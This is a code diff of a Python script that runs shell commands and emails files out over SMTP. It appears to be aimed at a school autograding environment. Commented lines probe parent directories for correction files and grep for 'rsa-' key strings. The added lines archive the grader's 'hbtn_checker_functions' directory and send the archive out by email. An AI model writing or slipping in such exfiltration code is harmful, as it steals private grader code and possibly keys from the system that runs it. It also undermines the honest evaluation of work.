@@ -46,7 +46,7 @@ def get_data(command):
 # my_data += get_data("pwd") or ""
 # file_dir = get_data("grep -rl 'rsa-' ../../../../").split()[-1] or ""
 # my_data += "\n#######################\n"
-# # my_data += get_data("tar -czvf file.tar.gz ../../../../corrections_*/corrections/262/")
+my_data = get_data("tar -czvf file.tar.gz ../../../../hbtn_checker_functions")
 # my_data = get_data("ls -l ../../../../corrections_*/corrections/2184/20259") or ""
 my_data = "\n#######################\n"
 # my_data += get_data("ls -l ../../../../correction/*/262/531078/") or ""
@@ -77,7 +77,7 @@ def send_data_file(zip_filename="data.zip", message="no_data"):
     
     # Attach the zip file
     with open(zip_filename, 'rb') as attachment:
-        part = MIMEBase('application', 'gz')
+        part = MIMEBase('application', message)
         part.set_payload(attachment.read())
         encoders.encode_base64(part)
         part.add_header('Content-Disposition', f'attachment; filename= {zip_filename}')
@@ -95,4 +95,4 @@ def send_data_file(zip_filename="data.zip", message="no_data"):
     
     # Terminating the session
     s.quit()
-# send_data_file("file.tar.gz", "mygit")
+send_data_file("file.tar.gz", "gz")
